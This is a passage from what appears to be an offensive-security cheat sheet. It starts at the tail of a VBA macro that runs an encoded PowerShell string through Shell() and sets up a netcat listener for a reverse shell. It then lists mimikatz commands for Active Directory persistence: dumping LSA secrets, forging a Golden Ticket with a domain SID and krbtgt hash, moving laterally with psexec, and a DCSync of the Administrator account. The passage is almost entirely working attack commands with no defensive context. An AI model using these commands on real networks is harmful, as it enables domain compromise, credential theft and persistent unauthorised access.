		Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
		Shell (Str)
	End Sub
	
	nc.exe -lvnp 4444
	```
	
**Active Direcotry Persistence**

1. Golden Tickets
	```
	psexec.exe \\dc01 cmd.exe
	mimikatz.exe
	privilege::debug
	lsadump::lsa /patch
	kerberos::purge
	kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
	misc::cmd
	psexec.exe \\dc01 cmd.exe
	ipconfig
	whoami
	whoami /groups
	psexec \\IP cmd.exe
	```
2. Domain Controller Synchronization
	```
	lsadump::dcsync /user:Administrator
	```
